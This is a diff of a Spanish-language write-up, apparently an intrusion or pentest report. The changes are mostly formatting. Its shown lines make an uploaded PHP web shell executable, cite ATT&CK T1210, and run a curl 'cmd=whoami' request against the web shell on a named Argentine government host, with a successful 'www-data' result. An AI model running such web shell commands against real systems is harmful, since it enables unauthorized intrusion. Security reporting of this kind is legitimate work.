@@ -684,21 +684,26 @@ resultado:
    ```
   
   asigno permiso:
+ 
    ```text
       chmod +x /tmp/uploads/shell.php
    ```
+  
   - T1210 – Exploitation of Remote Services
-
 
    verificación:
 
   Desde el exterior, pruebo el web shell
   
-  ```text
-  curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
-  ```
+   ```text
+    curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
+   ```
+   
    respuesta:
+   ```text
+   
    Resultado exitoso: www-data
+   ```
    
    
    Verificación de conectividad de red:
